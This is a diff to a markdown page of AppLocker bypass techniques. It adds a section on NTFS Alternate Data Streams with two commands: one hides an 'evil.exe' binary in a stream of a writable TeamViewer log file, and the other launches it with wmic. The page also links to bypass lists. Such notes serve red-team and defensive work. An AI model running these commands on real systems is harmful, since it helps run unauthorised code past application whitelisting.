@@ -70,3 +70,18 @@ Bypasses Constrained language mode in PowerShell (and also logging). To fix this
 ```
 cmd.exe /c whoami
 ```
+
+### NTFS Alternate Data Streams (ADS)
+
+AppLocker rules does not stop things that execute in ADS. More info on that here: [https://hitco.at/blog/howto-prevent-bypassing-applocker-using-alternate-data-streams/](https://hitco.at/blog/howto-prevent-bypassing-applocker-using-alternate-data-streams/) This means you can pipe data to a stream and execute it using many of the different methods: [https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f](https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f)
+
+Example on adding binary to a writable file under program files (using ADS):
+
+```
+type C:\temp\evil.exe > "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"
+
+wmic process call create '"C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"'
+```
+
+\
+[https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md](https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md)
